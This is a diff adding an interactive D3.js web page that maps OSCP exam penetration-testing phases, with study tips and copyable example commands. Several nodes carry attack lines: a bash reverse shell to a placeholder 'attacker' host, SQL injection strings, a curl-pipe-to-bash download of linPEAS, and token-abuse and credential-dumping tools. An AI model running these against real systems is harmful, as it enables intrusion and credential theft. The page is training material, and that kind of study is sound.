@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ultimate Cyber Kill Chain Interactive Map | OSCP PEN-200</title>
+    <script src="https://d3js.org/d3.v7.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+            color: #00ff41;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            display: flex;
+            height: 100vh;
+            gap: 0;
+        }
+
+        .canvas {
+            flex: 1;
+            position: relative;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+            overflow: hidden;
+        }
+
+        #graph {
+            width: 100%;
+            height: 100%;
+        }
+
+        svg {
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+        }
+
+        .sidebar {
+            width: 350px;
+            background: rgba(0, 0, 0, 0.9);
+            border-left: 3px solid #00ff41;
+            overflow-y: auto;
+            padding: 20px;
+            box-shadow: -10px 0 40px rgba(0, 0, 0, 0.8);
+        }
+
+        .sidebar::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .sidebar::-webkit-scrollbar-track {
+            background: #1a1f3a;
+        }
+
+        .sidebar::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            border-radius: 4px;
+        }
+
+        .info-panel {
+            display: none;
+        }
+
+        .info-panel.active {
+            display: block;
+            animation: slideIn 0.3s ease-in-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .info-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #00ff41;
+            margin-bottom: 10px;
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .info-section {
+            margin: 15px 0;
+        }
+
+        .info-label {
+            color: #ff006e;
+            font-weight: bold;
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .info-content {
+            color: #00ff41;
+            font-size: 12px;
+            line-height: 1.6;
+            background: rgba(0, 255, 65, 0.05);
+            padding: 8px;
+            border-left: 2px solid #00ff41;
+            margin-bottom: 8px;
+        }
+
+        .tool-tag {
+            display: inline-block;
+            background: rgba(255, 0, 110, 0.2);
+            color: #ff006e;
+            padding: 3px 8px;
+            margin: 2px;
+            font-size: 10px;
+            border-radius: 3px;
+            border: 1px solid #ff006e;
+            margin-bottom: 5px;
+        }
+
+        .command-block {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #00ff41;
+            padding: 8px;
+            margin: 5px 0;
+            font-size: 10px;
+            overflow-x: auto;
+            cursor: copy;
+            transition: all 0.2s;
+        }
+
+        .command-block:hover {
+            background: rgba(0, 255, 65, 0.1);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+
+        .header {
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 2px solid #00ff41;
+            text-align: center;
+        }
+
+        .header h1 {
+            color: #00ff41;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            color: #ff006e;
+            font-size: 11px;
+        }
+
+        node {
+            cursor: pointer;
+            stroke: #00ff41;
+            stroke-width: 2px;
+        }
+
+        node:hover {
+            stroke: #ff006e;
+            stroke-width: 3px;
+            filter: drop-shadow(0 0 8px #00ff41);
+        }
+
+        .node-label {
+            font-size: 11px;
+            pointer-events: none;
+            text-anchor: middle;
+            fill: #00ff41;
+            font-weight: bold;
+        }
+
+        link {
+            stroke: rgba(0, 255, 65, 0.3);
+            stroke-width: 2px;
+        }
+
+        link.phase1 { stroke: rgba(100, 200, 255, 0.5); }
+        link.phase2 { stroke: rgba(0, 255, 127, 0.5); }
+        link.phase3 { stroke: rgba(255, 165, 0, 0.5); }
+        link.phase4 { stroke: rgba(255, 69, 0, 0.5); }
+        link.phase5 { stroke: rgba(220, 20, 60, 0.5); }
+        link.phase6 { stroke: rgba(186, 85, 211, 0.5); }
+        link.phase7 { stroke: rgba(0, 255, 200, 0.5); }
+
+        .phase-indicator {
+            margin: 10px 0;
+            padding: 8px;
+            border-left: 3px solid;
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .phase-time {
+            color: #ffaa00;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        .legend {
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00ff41;
+        }
+
+        .legend-item {
+            display: flex;
+            align-items: center;
+            margin: 3px 0;
+            font-size: 11px;
+        }
+
+        .legend-color {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .difficulty-low { color: #00ff41; }
+        .difficulty-medium { color: #ffaa00; }
+        .difficulty-high { color: #ff006e; }
+
+        .controls {
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00ff41;
+            margin: 10px 0;
+        }
+
+        button {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            background: rgba(0, 255, 65, 0.1);
+            color: #00ff41;
+            border: 1px solid #00ff41;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            text-transform: uppercase;
+            transition: all 0.2s;
+        }
+
+        button:hover {
+            background: rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+
+        .warning {
+            color: #ff006e;
+            font-size: 10px;
+            margin-top: 10px;
+            padding: 8px;
+            background: rgba(255, 0, 110, 0.1);
+            border: 1px solid #ff006e;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 10px 0;
+            font-size: 11px;
+        }
+
+        .stat-box {
+            background: rgba(0, 255, 65, 0.05);
+            padding: 8px;
+            border: 1px solid #00ff41;
+            text-align: center;
+        }
+
+        .stat-value {
+            color: #ff006e;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            color: #00ff41;
+            font-size: 9px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 30px 20px;
+            color: #666;
+        }
+
+        .empty-state h3 {
+            color: #00ff41;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="canvas">
+            <div id="graph"></div>
+        </div>
+
+        <div class="sidebar">
+            <div class="header">
+                <h1>⚔️ Cyber Kill Chain</h1>
+                <p>Interactive Attack Visualization</p>
+            </div>
+
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-label">Total Nodes</div>
+                    <div class="stat-value" id="totalNodes">0</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-label">Attack Paths</div>
+                    <div class="stat-value" id="totalLinks">0</div>
+                </div>
+            </div>
+
+            <div class="legend">
+                <div class="info-label">Phase Colors</div>
+                <div class="legend-item"><div class="legend-color" style="background: #64c8ff;"></div>Phase 1: Recon</div>
+                <div class="legend-item"><div class="legend-color" style="background: #00ff7f;"></div>Phase 2: Enum</div>
+                <div class="legend-item"><div class="legend-color" style="background: #ffa500;"></div>Phase 3: Exploit</div>
+                <div class="legend-item"><div class="legend-color" style="background: #ff4500;"></div>Phase 4: Access</div>
+                <div class="legend-item"><div class="legend-color" style="background: #dc143c;"></div>Phase 5: Post</div>
+                <div class="legend-item"><div class="legend-color" style="background: #ba55d3;"></div>Phase 6: Privesc</div>
+                <div class="legend-item"><div class="legend-color" style="background: #00ffc8;"></div>Phase 7: Proof</div>
+            </div>
+
+            <div class="controls">
+                <button onclick="resetView()">🔄 Reset View</button>
+                <button onclick="togglePhysics()">⚡ Toggle Physics</button>
+                <button onclick="zoomToFit()">🎯 Zoom to Fit</button>
+            </div>
+
+            <div id="infoContainer"></div>
+
+            <div class="empty-state" id="emptyState">
+                <h3>👁️ Click a Node</h3>
+                <p>Select any node on the map to view details</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===================== DATA STRUCTURE =====================
+        const killChainData = {
+            nodes: [
+                // Phase 1: Reconnaissance
+                { id: "recon", phase: 1, name: "Reconnaissance", type: "phase", color: "#64c8ff" },
+                { id: "target-identification", phase: 1, name: "Target ID", type: "task", color: "#64c8ff" },
+                { id: "domain-research", phase: 1, name: "Domain Research", type: "task", color: "#64c8ff" },
+                { id: "whois-dns", phase: 1, name: "WHOIS/DNS", type: "tool", color: "#64c8ff" },
+
+                // Phase 2: Enumeration
+                { id: "enumeration", phase: 2, name: "Enumeration (50% Time!)", type: "phase", color: "#00ff7f" },
+                { id: "nmap-scan", phase: 2, name: "Nmap Scanning", type: "tool", color: "#00ff7f" },
+                { id: "port-enumeration", phase: 2, name: "Port Enumeration", type: "task", color: "#00ff7f" },
+                { id: "service-detection", phase: 2, name: "Service Detection", type: "task", color: "#00ff7f" },
+                { id: "web-enumeration", phase: 2, name: "Web Enumeration", type: "task", color: "#00ff7f" },
+                { id: "smb-enum", phase: 2, name: "SMB Enumeration", type: "tool", color: "#00ff7f" },
+                { id: "ldap-enum", phase: 2, name: "LDAP Enumeration", type: "tool", color: "#00ff7f" },
+
+                // Phase 3: Vulnerability Analysis
+                { id: "analysis", phase: 3, name: "Vulnerability Analysis", type: "phase", color: "#ffa500" },
+                { id: "cve-research", phase: 3, name: "CVE Research", type: "task", color: "#ffa500" },
+                { id: "manual-testing", phase: 3, name: "Manual Testing", type: "task", color: "#ffa500" },
+
+                // Phase 4: Exploitation Entry Points
+                { id: "exploitation", phase: 4, name: "Exploitation", type: "phase", color: "#ff4500" },
+                { id: "web-rce", phase: 4, name: "Web RCE", type: "vector", color: "#ff4500" },
+                { id: "sql-injection", phase: 4, name: "SQL Injection", type: "vector", color: "#ff4500" },
+                { id: "default-creds", phase: 4, name: "Default Credentials", type: "vector", color: "#ff4500" },
+                { id: "file-upload", phase: 4, name: "File Upload Bypass", type: "vector", color: "#ff4500" },
+                { id: "lfi-rfi", phase: 4, name: "LFI/RFI to RCE", type: "vector", color: "#ff4500" },
+                { id: "buffer-overflow", phase: 4, name: "Buffer Overflow", type: "vector", color: "#ff4500" },
+                { id: "initial-shell", phase: 4, name: "Obtain Shell", type: "task", color: "#ff4500" },
+
+                // Phase 5: Post-Exploitation
+                { id: "post-exploit", phase: 5, name: "Post-Exploitation", type: "phase", color: "#dc143c" },
+                { id: "shell-stabilize", phase: 5, name: "Stabilize Shell", type: "task", color: "#dc143c" },
+                { id: "system-info", phase: 5, name: "System Enumeration", type: "task", color: "#dc143c" },
+                { id: "linpeas", phase: 5, name: "linPEAS/winPEAS", type: "tool", color: "#dc143c" },
+                { id: "credential-hunting", phase: 5, name: "Credential Hunting", type: "task", color: "#dc143c" },
+
+                // Phase 6: Privilege Escalation
+                { id: "privesc", phase: 6, name: "Privilege Escalation", type: "phase", color: "#ba55d3" },
+                { id: "sudo-check", phase: 6, name: "Sudo -l Check", type: "task", color: "#ba55d3" },
+                { id: "suid-binaries", phase: 6, name: "SUID Binaries", type: "vector", color: "#ba55d3" },
+                { id: "kernel-exploit", phase: 6, name: "Kernel Exploits", type: "vector", color: "#ba55d3" },
+                { id: "service-exploit", phase: 6, name: "Service Misconfiguration", type: "vector", color: "#ba55d3" },
+                { id: "cron-jobs", phase: 6, name: "Cron Job Hijacking", type: "vector", color: "#ba55d3" },
+                { id: "dll-hijacking", phase: 6, name: "DLL Hijacking (Windows)", type: "vector", color: "#ba55d3" },
+                { id: "token-abuse", phase: 6, name: "Token Abuse (Windows)", type: "vector", color: "#ba55d3" },
+                { id: "ad-exploitation", phase: 6, name: "AD Exploitation", type: "vector", color: "#ba55d3" },
+                { id: "root-access", phase: 6, name: "Root/SYSTEM Access", type: "task", color: "#ba55d3" },
+
+                // Phase 7: Proof Collection
+                { id: "proof", phase: 7, name: "Proof Collection", type: "phase", color: "#00ffc8" },
+                { id: "capture-proof", phase: 7, name: "Capture proof.txt", type: "task", color: "#00ffc8" },
+                { id: "screenshot-proof", phase: 7, name: "Screenshot Evidence", type: "task", color: "#00ffc8" },
+                { id: "document-proof", phase: 7, name: "Document Attack Chain", type: "task", color: "#00ffc8" },
+
+                // Decision Trees & Common Mistakes
+                { id: "decision-point", phase: 0, name: "⚡ Decision Point", type: "decision", color: "#ff00ff" },
+                { id: "stuck-90min", phase: 0, name: "🚨 Stuck 90min?", type: "warning", color: "#ff0000" },
+                { id: "no-screenshot", phase: 0, name: "🚨 No Screenshot?", type: "warning", color: "#ff0000" },
+            ],
+            links: [
+                // Reconnaissance -> Enumeration
+                { source: "recon", target: "enumeration", phase: 1 },
+                { source: "target-identification", target: "domain-research", phase: 1 },
+                { source: "domain-research", target: "whois-dns", phase: 1 },
+                { source: "whois-dns", target: "enumeration", phase: 1 },
+
+                // Enumeration paths
+                { source: "enumeration", target: "nmap-scan", phase: 2 },
+                { source: "nmap-scan", target: "port-enumeration", phase: 2 },
+                { source: "port-enumeration", target: "service-detection", phase: 2 },
+                { source: "service-detection", target: "web-enumeration", phase: 2 },
+                { source: "service-detection", target: "smb-enum", phase: 2 },
+                { source: "service-detection", target: "ldap-enum", phase: 2 },
+                { source: "web-enumeration", target: "analysis", phase: 2 },
+                { source: "smb-enum", target: "analysis", phase: 2 },
+                { source: "ldap-enum", target: "analysis", phase: 2 },
+
+                // Analysis -> Exploitation paths
+                { source: "analysis", target: "exploitation", phase: 3 },
+                { source: "cve-research", target: "exploitation", phase: 3 },
+
+                // Exploitation vectors
+                { source: "exploitation", target: "sql-injection", phase: 4 },
+                { source: "exploitation", target: "web-rce", phase: 4 },
+                { source: "exploitation", target: "default-creds", phase: 4 },
+                { source: "exploitation", target: "file-upload", phase: 4 },
+                { source: "exploitation", target: "lfi-rfi", phase: 4 },
+                { source: "exploitation", target: "buffer-overflow", phase: 4 },
+
+                // Get shell
+                { source: "sql-injection", target: "initial-shell", phase: 4 },
+                { source: "web-rce", target: "initial-shell", phase: 4 },
+                { source: "default-creds", target: "initial-shell", phase: 4 },
+                { source: "file-upload", target: "initial-shell", phase: 4 },
+                { source: "lfi-rfi", target: "initial-shell", phase: 4 },
+                { source: "buffer-overflow", target: "initial-shell", phase: 4 },
+                { source: "initial-shell", target: "post-exploit", phase: 4 },
+
+                // Post-exploitation
+                { source: "post-exploit", target: "shell-stabilize", phase: 5 },
+                { source: "shell-stabilize", target: "system-info", phase: 5 },
+                { source: "system-info", target: "linpeas", phase: 5 },
+                { source: "linpeas", target: "credential-hunting", phase: 5 },
+                { source: "credential-hunting", target: "privesc", phase: 5 },
+
+                // Privilege escalation paths
+                { source: "privesc", target: "sudo-check", phase: 6 },
+                { source: "sudo-check", target: "root-access", phase: 6 },
+                { source: "privesc", target: "suid-binaries", phase: 6 },
+                { source: "suid-binaries", target: "root-access", phase: 6 },
+                { source: "privesc", target: "kernel-exploit", phase: 6 },
+                { source: "kernel-exploit", target: "root-access", phase: 6 },
+                { source: "privesc", target: "service-exploit", phase: 6 },
+                { source: "service-exploit", target: "root-access", phase: 6 },
+                { source: "privesc", target: "cron-jobs", phase: 6 },
+                { source: "cron-jobs", target: "root-access", phase: 6 },
+                { source: "privesc", target: "dll-hijacking", phase: 6 },
+                { source: "dll-hijacking", target: "root-access", phase: 6 },
+                { source: "privesc", target: "token-abuse", phase: 6 },
+                { source: "token-abuse", target: "root-access", phase: 6 },
+                { source: "privesc", target: "ad-exploitation", phase: 6 },
+                { source: "ad-exploitation", target: "root-access", phase: 6 },
+
+                // Proof collection
+                { source: "root-access", target: "proof", phase: 7 },
+                { source: "proof", target: "capture-proof", phase: 7 },
+                { source: "proof", target: "screenshot-proof", phase: 7 },
+                { source: "proof", target: "document-proof", phase: 7 },
+
+                // Decision points
+                { source: "port-enumeration", target: "stuck-90min", phase: 0 },
+                { source: "initial-shell", target: "no-screenshot", phase: 0 },
+            ]
+        };
+
+        // ===================== NODE INFORMATION =====================
+        const nodeInfo = {
+            "recon": {
+                phase: 1,
+                time: "~10 min",
+                description: "Initial target identification and information gathering",
+                tools: ["whois", "nslookup", "dig", "google dorking"],
+                commands: ["whois target.com", "dig target.com", "nslookup target.com"],
+                difficulty: "easy",
+                mistakes: "Moving too fast to enumeration"
+            },
+            "enumeration": {
+                phase: 2,
+                time: "~45 min (50% OF EXAM TIME!)",
+                description: "CRITICAL: Spend 50% of time here. Miss nothing!",
+                tools: ["nmap", "gobuster", "nmap-scripts", "curl", "nikto"],
+                commands: ["nmap -sV -sC -A target", "gobuster dir -u http://target -w wordlist.txt"],
+                difficulty: "critical",
+                mistakes: "Too fast enumeration = missed vectors"
+            },
+            "nmap-scan": {
+                phase: 2,
+                time: "~5-10 min",
+                description: "Network reconnaissance with Nmap",
+                tools: ["nmap"],
+                commands: ["nmap -p- target", "nmap -sV -sC -p- target", "nmap -sU target"],
+                difficulty: "easy",
+                links: "Nmap-Cheatsheet.md"
+            },
+            "sql-injection": {
+                phase: 4,
+                time: "~5 min to detect, 10-20 min to exploit",
+                description: "Detect and exploit SQL injection vulnerabilities",
+                tools: ["sqlmap", "burp suite", "manual testing"],
+                commands: ["sqlmap -u 'http://target/page?id=1' --dbs", "' OR '1'='1", "' UNION SELECT NULL--"],
+                difficulty: "high",
+                links: "SQL-Injection.md",
+                severity: "CRITICAL"
+            },
+            "web-rce": {
+                phase: 4,
+                time: "~10-30 min",
+                description: "Remote Code Execution via web application",
+                tools: ["reverse shell", "meterpreter", "webshell"],
+                commands: ["bash -i >& /dev/tcp/attacker/4444 0>&1"],
+                difficulty: "high",
+                links: "Web-Vulnerabilities.md"
+            },
+            "sudo-check": {
+                phase: 6,
+                time: "~1 min to check",
+                description: "ALWAYS check sudo -l FIRST! 95% success rate",
+                tools: ["sudo"],
+                commands: ["sudo -l", "sudo -l -U username"],
+                difficulty: "easy",
+                success_rate: "95%",
+                links: "Linux-Privesc.md"
+            },
+            "suid-binaries": {
+                phase: 6,
+                time: "~5 min to find, 5-30 min to exploit",
+                description: "Find and exploit SUID binaries using GTFOBins",
+                tools: ["find", "GTFOBins", "custom exploit"],
+                commands: ["find / -perm -4000 2>/dev/null", "gtfobins.github.io"],
+                difficulty: "high",
+                links: "Linux-Privesc.md"
+            },
+            "linpeas": {
+                phase: 5,
+                time: "~2-5 min to run and analyze",
+                description: "Automated Linux privilege escalation scanner - finds 80% of vectors",
+                tools: ["linPEAS"],
+                commands: ["curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash"],
+                difficulty: "easy",
+                accuracy: "80%+ of privesc vectors",
+                links: "Post-Exploitation-Deep-Dive.md"
+            },
+            "stuck-90min": {
+                phase: 0,
+                time: "DECISION TIME",
+                description: "⚠️ RULE: If stuck > 90min on one machine, SWITCH! Come back later",
+                tools: ["Decision Tree"],
+                commands: ["Switch to next machine, rotate strategy"],
+                difficulty: "critical",
+                impact: "Prevents tunnel vision failure"
+            },
+            "no-screenshot": {
+                phase: 0,
+                time: "IMMEDIATE ACTION",
+                description: "⚠️ DANGER: No screenshot taken = ZERO POINTS on that machine!",
+                tools: ["Screenshot tool"],
+                commands: ["Take screenshot immediately", "screenshot -o proof.png"],
+                difficulty: "critical",
+                impact: "10-25 point loss per machine"
+            },
+            "initial-shell": {
+                phase: 4,
+                time: "~30-60 min total from exploitation start",
+                description: "Obtain initial shell access (www-data, iis_apppool, etc.)",
+                tools: ["reverse shells", "meterpreter", "netcat"],
+                commands: ["nc -lvnp 4444", "python3 -c 'import socket,subprocess,os;..."],
+                difficulty: "high",
+                links: "Shells-and-Payloads.md"
+            },
+            "root-access": {
+                phase: 6,
+                time: "~60 min (varies by difficulty)",
+                description: "Achieve root/SYSTEM level privileges",
+                tools: ["various privesc tools"],
+                commands: ["sudo su", "whoami (should show: root or nt authority\\system)"],
+                difficulty: "critical",
+                success_indicator: "uid=0(root) or SYSTEM"
+            },
+            "capture-proof": {
+                phase: 7,
+                time: "~5 min",
+                description: "Read proof.txt file to capture required hash",
+                tools: ["cat"],
+                commands: ["cat /root/proof.txt", "cat C:\\Users\\Administrator\\Desktop\\proof.txt"],
+                difficulty: "easy",
+                required: "YES - NO POINTS WITHOUT THIS"
+            },
+            "screenshot-proof": {
+                phase: 7,
+                time: "~2 min per screenshot",
+                description: "Screenshot proof.txt contents and whoami output",
+                tools: ["screenshot", "snipping tool"],
+                commands: ["screenshot", "whoami"],
+                difficulty: "easy",
+                required: "YES - PROOF OF COMPROMISE"
+            },
+            "token-abuse": {
+                phase: 6,
+                time: "~10-30 min",
+                description: "Exploit Windows token privileges (SeImpersonate, SeAssignPrimaryToken)",
+                tools: ["JuicyPotato", "PrintSpoofer", "RoguePotato"],
+                commands: ["whoami /all", "JuicyPotato.exe -t * -p cmd.exe"],
+                difficulty: "high",
+                links: "Windows-Privesc.md"
+            },
+            "ad-exploitation": {
+                phase: 6,
+                time: "~60-120 min",
+                description: "Active Directory exploitation (Kerberoasting, DCSync, etc.)",
+                tools: ["Impacket", "Mimikatz", "BloodHound", "PowerView"],
+                commands: ["GetUserSPNs.py", "secretsdump.py", "Invoke-Kerberoast"],
+                difficulty: "critical",
+                links: "Active-Directory.md"
+            }
+        };
+
+        // ===================== D3.JS VISUALIZATION =====================
+        let simulation = null;
+        let svg = null;
+        let width = document.querySelector('.canvas').clientWidth;
+        let height = document.querySelector('.canvas').clientHeight;
+        let physicsEnabled = true;
+
+        function initVisualization() {
+            const container = document.getElementById('graph');
+            container.innerHTML = '';
+
+            svg = d3.select('#graph')
+                .append('svg')
+                .attr('width', width)
+                .attr('height', height);
+
+            // Add zoom
+            const g = svg.append('g');
+            svg.call(d3.zoom().on('zoom', (event) => {
+                g.attr('transform', event.transform);
+            }));
+
+            // Create force simulation
+            simulation = d3.forceSimulation(killChainData.nodes)
+                .force('link', d3.forceLink(killChainData.links)
+                    .id(d => d.id)
+                    .distance(100)
+                    .strength(0.5))
+                .force('charge', d3.forceManyBody().strength(-300))
+                .force('center', d3.forceCenter(width / 2, height / 2))
+                .force('collision', d3.forceCollide(30));
+
+            // Create links
+            const link = g.append('g')
+                .selectAll('line')
+                .data(killChainData.links)
+                .join('line')
+                .attr('class', d => `phase${d.phase}`)
+                .style('stroke-width', 2);
+
+            // Create nodes
+            const node = g.append('g')
+                .selectAll('circle')
+                .data(killChainData.nodes)
+                .join('circle')
+                .attr('r', d => {
+                    if (d.type === 'phase') return 25;
+                    if (d.type === 'decision' || d.type === 'warning') return 20;
+                    return 15;
+                })
+                .attr('fill', d => d.color)
+                .attr('stroke', '#00ff41')
+                .attr('stroke-width', 2)
+                .call(drag(simulation))
+                .on('click', (event, d) => showNodeInfo(d));
+
+            // Create labels
+            const labels = g.append('g')
+                .selectAll('text')
+                .data(killChainData.nodes)
+                .join('text')
+                .attr('class', 'node-label')
+                .attr('text-anchor', 'middle')
+                .attr('dy', '0.3em')
+                .text(d => {
+                    if (d.type === 'phase') return d.name.split(' ')[0];
+                    return d.name.substring(0, 12);
+                })
+                .style('font-size', d => d.type === 'phase' ? '12px' : '9px');
+
+            // Update positions
+            simulation.on('tick', () => {
+                link
+                    .attr('x1', d => d.source.x)
+                    .attr('y1', d => d.source.y)
+                    .attr('x2', d => d.target.x)
+                    .attr('y2', d => d.target.y);
+
+                node
+                    .attr('cx', d => d.x = Math.max(30, Math.min(width - 30, d.x)))
+                    .attr('cy', d => d.y = Math.max(30, Math.min(height - 30, d.y)));
+
+                labels
+                    .attr('x', d => d.x)
+                    .attr('y', d => d.y);
+            });
+
+            // Update stats
+            document.getElementById('totalNodes').textContent = killChainData.nodes.length;
+            document.getElementById('totalLinks').textContent = killChainData.links.length;
+        }
+
+        function drag(simulation) {
+            function dragStarted(event, d) {
+                if (!event.active) simulation.alphaTarget(0.3).restart();
+                d.fx = d.x;
+                d.fy = d.y;
+            }
+
+            function dragged(event, d) {
+                d.fx = event.x;
+                d.fy = event.y;
+            }
+
+            function dragEnded(event, d) {
+                if (!event.active) simulation.alphaTarget(0);
+                d.fx = null;
+                d.fy = null;
+            }
+
+            return d3.drag()
+                .on('start', dragStarted)
+                .on('drag', dragged)
+                .on('end', dragEnded);
+        }
+
+        function showNodeInfo(node) {
+            const infoContainer = document.getElementById('infoContainer');
+            const emptyState = document.getElementById('emptyState');
+            const info = nodeInfo[node.id];
+
+            if (!info) {
+                infoContainer.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+
+            emptyState.style.display = 'none';
+
+            let html = `
+                <div class="info-panel active">
+                    <div class="info-title">${node.name}</div>
+
+                    <div class="phase-indicator" style="border-left-color: ${node.color}">
+                        <div class="info-label">Phase ${node.phase}</div>
+                        <div class="phase-time">${info.time}</div>
+                    </div>
+
+                    <div class="info-section">
+                        <div class="info-label">Description</div>
+                        <div class="info-content">${info.description}</div>
+                    </div>
+            `;
+
+            if (info.difficulty) {
+                const diffClass = info.difficulty === 'critical' ? 'difficulty-high' :
+                                info.difficulty === 'hard' ? 'difficulty-high' :
+                                info.difficulty === 'medium' ? 'difficulty-medium' : 'difficulty-low';
+                html += `
+                    <div class="info-section">
+                        <div class="info-label">Difficulty</div>
+                        <div class="${diffClass}">${info.difficulty.toUpperCase()}</div>
+                    </div>
+                `;
+            }
+
+            if (info.success_rate) {
+                html += `
+                    <div class="info-section">
+                        <div class="info-label">Success Rate</div>
+                        <div class="info-content">${info.success_rate}</div>
+                    </div>
+                `;
+            }
+
+            if (info.tools) {
+                html += `
+                    <div class="info-section">
+                        <div class="info-label">Tools</div>
+                        <div>${info.tools.map(t => `<div class="tool-tag">${t}</div>`).join('')}</div>
+                    </div>
+                `;
+            }
+
+            if (info.commands) {
+                html += `
+                    <div class="info-section">
+                        <div class="info-label">Example Commands</div>
+                        ${info.commands.map(cmd => `<div class="command-block" onclick="copyCommand(this)">${cmd}</div>`).join('')}
+                    </div>
+                `;
+            }
+
+            if (info.links) {
+                html += `
+                    <div class="info-section">
+                        <div class="info-label">📖 Related Note</div>
+                        <div class="info-content">${info.links}</div>
+                    </div>
+                `;
+            }
+
+            if (node.type === 'warning' || node.type === 'decision') {
+                html += `
+                    <div class="warning">
+                        ⚠️ ${info.impact || 'Critical decision point'}
+                    </div>
+                `;
+            }
+
+            html += `</div>`;
+            infoContainer.innerHTML = html;
+        }
+
+        function copyCommand(element) {
+            const text = element.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                element.style.background = 'rgba(0, 255, 65, 0.3)';
+                setTimeout(() => {
+                    element.style.background = 'rgba(0, 0, 0, 0.7)';
+                }, 500);
+            });
+        }
+
+        function resetView() {
+            if (simulation) {
+                simulation.restart();
+            }
+            initVisualization();
+        }
+
+        function togglePhysics() {
+            physicsEnabled = !physicsEnabled;
+            if (physicsEnabled) {
+                simulation.alpha(0.3).restart();
+            } else {
+                simulation.stop();
+            }
+        }
+
+        function zoomToFit() {
+            const bounds = svg.node().getBBox();
+            const fullWidth = bounds.width;
+            const fullHeight = bounds.height;
+            const midX = bounds.x + fullWidth / 2;
+            const midY = bounds.y + fullHeight / 2;
+
+            const scale = 0.8 / Math.max(fullWidth / width, fullHeight / height);
+            const translate = [width / 2 - scale * midX, height / 2 - scale * midY];
+
+            svg.transition().duration(750).call(
+                d3.zoom().transform,
+                d3.zoomIdentity.translate(translate[0], translate[1]).scale(scale)
+            );
+        }
+
+        // Initialize on load
+        window.addEventListener('load', () => {
+            initVisualization();
+            zoomToFit();
+        });
+
+        // Handle window resize
+        window.addEventListener('resize', () => {
+            width = document.querySelector('.canvas').clientWidth;
+            height = document.querySelector('.canvas').clientHeight;
+            resetView();
+        });
+    </script>
+</body>
+</html>
